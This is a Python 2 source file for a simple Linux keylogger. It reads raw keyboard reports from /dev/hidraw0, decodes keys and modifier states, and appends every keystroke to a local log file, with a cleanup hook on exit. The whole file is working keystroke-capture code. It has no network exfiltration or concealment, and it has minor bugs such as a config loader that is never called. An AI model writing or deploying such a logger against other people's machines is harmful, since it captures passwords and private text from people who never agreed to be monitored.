#!/usr/bin/python

"""
A simple keylogger for Linux. You will need to edit the config file to grab
input from the correct /dev/ device.
"""

import os
import atexit
from time import sleep, localtime, strftime

settings = {}
kb = open("/dev/hidraw0")
logfile = open("/home/nox/.keylogger/log", 'a')

keycodes = {
    0 : "",
    40 : "<ret>",
    41 : "<esc>",
    42 : "<del>",
    43 : "<tab>",
    44 : "<space>",
    45 : "-",
    46 : "=",
    47 : "[",
    48 : "]",
    49 : "\\",
    51 : ";",
    52 : "'",
    53 : "`",
    54 : ",",
    55 : ".",
    56 : "/",
    57 : "<CAPSLOCK>",
    58 : "<F1>",
    59 : "<F2>",
    60 : "<F3>",
    61 : "<F4>",
    62 : "<F5>",
    63 : "<F6>",
    64 : "<F7>",
    65 : "<F8>",
    66 : "<F9>",
    67 : "<F10>",
    68 : "<F11>",
    69 : "<F12>",
    79 : "<RIGHT>",
    80 : "<LEFT>",
    81 : "<DOWN>",
    82 : "<UP>"
}

for c in "abcdefghijklmnopqrstuvwxyz":
    code = ord(c) - ord('a') + 4
    keycodes[code] = c

nums = "1234567890"
for i in range(len(nums)):
    code = i + 30
    keycodes[code] = nums[i]

def get_modifiers(L):
    """
    MODIFIER KEYS: 8 BIT CODE:

    0 0 0 0 0 0 0 0
    | | | | | | | |___ Left Control
    | | | | | | |_____ Left Shift
    | | | | | |_______ Left Alt
    | | | | |_________ Left Super
    | | | |___________ Right Control
    | | |_____________ Right Shift
    | |_______________ Right Alt
    |_________________ Right Super
    """
    modifiers = ["__"] * 9

    def bit(n):
        return (L[1] >> n) & 0x1

    def bit_on(n):
        return bit(n) == 1

    if bit_on(0):
        modifiers[0] = "C_"
    if bit_on(1):
        modifiers[1] = "Sh"
    if bit_on(2):
        modifiers[2] = "A_"
    if bit_on(3):
        modifiers[3] = "S_"
    if bit_on(4):
        modifiers[4] = "C_"
    if bit_on(5):
        modifiers[5] = "Sh"
    if bit_on(6):
        modifiers[6] = "A_"
    if bit_on(7):
        modifiers[7] = "S_"
    if L[-1] == 2:
        modifiers[8] = "fn"

    return modifiers

def load_config():
    global settings
    conf = open("~/.keylogger/conf")
    data = conf.read().strip()
    for line in data.split("\n"):
        setting = line.split("=")
        if len(setting) != 2:
            print "Invalid conf file"
            exit(-1)
        settings[setting[0].strip()] = setting[1].strip()

def add_char(L):
    c = keycodes[L[3]] if L[3] in keycodes else "<UNKNOWN>"
    if c == "":
        return
    line = " | ".join(get_modifiers(L) + [c])
    logfile.write(line + "\n")
    logfile.flush()
    os.fsync(logfile.fileno())

def read_keyboard():
    global kb
    while True:
        L = [ ord(x) for x in kb.read(10) ]
        print L
        add_char(L)

# Shutdown hook for cleanup
def cleanup():
    print "Running shutdown hook..."
    global logfile, kb, keycodes, settings
    logfile.write("[[ %s ]] STOPPING... \n" % (strftime("%a, %d %b %Y %H:%M:%S", localtime())))
    logfile.close()
    kb.close()
    del logfile
    del kb
    del keycodes
    del settings
    print "Done!"

if __name__ == "__main__":
    atexit.register(cleanup)
    read_keyboard()

